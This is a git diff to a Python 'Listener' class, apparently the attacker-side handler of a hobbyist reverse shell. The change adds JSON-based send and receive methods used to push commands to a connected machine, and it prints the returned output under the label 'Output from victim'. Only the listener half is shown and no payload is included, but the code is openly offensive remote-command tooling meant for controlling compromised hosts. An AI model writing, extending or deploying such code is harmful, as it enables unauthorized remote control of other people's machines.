@@ -1,8 +1,7 @@
-import socket, sys
+import socket, sys, json
 
 
 class Listener:
-    
     
     def __init__(self,ip,port):
         self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -20,13 +19,35 @@ class Listener:
         print('Enter \'bye\' to close connection')
     
     
-    def executeCmd(self,cmd):
-        cmd = str(cmd).encode('utf-8')
-        self.connection.send(cmd)
-        result = self.connection.recv(1024)
-        result = result.decode()
-        return result #calling.executeCmd will return the result of the command sent by run()
+    def sendStream(self,data):
+        jsData = json.dumps(data)
+        self.connection.send(str(jsData).encode('utf-8'))
 
+
+    def recvStream(self):
+        jsData = self.connection.recv(1024)
+        try:
+
+            return json.loads(jsData)
+        except Exception as e:
+            print('Could not process JSON')
+            print(e)
+            print('Raw byte data:\n\n')
+            return jsData
+
+
+
+
+    def executeCmd(self,cmd):
+        #cmd = str(cmd).encode('utf-8')
+        print('executeCmd')
+        print(cmd)
+        self.sendStream(cmd)
+        #result = self.connection.recv(1024)
+        #result = result.decode()
+        print('Output from victim')
+        print('#'*100)
+        return self.recvStream() #calling.executeCmd will return the result of the command sent by run()
 
 
     def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
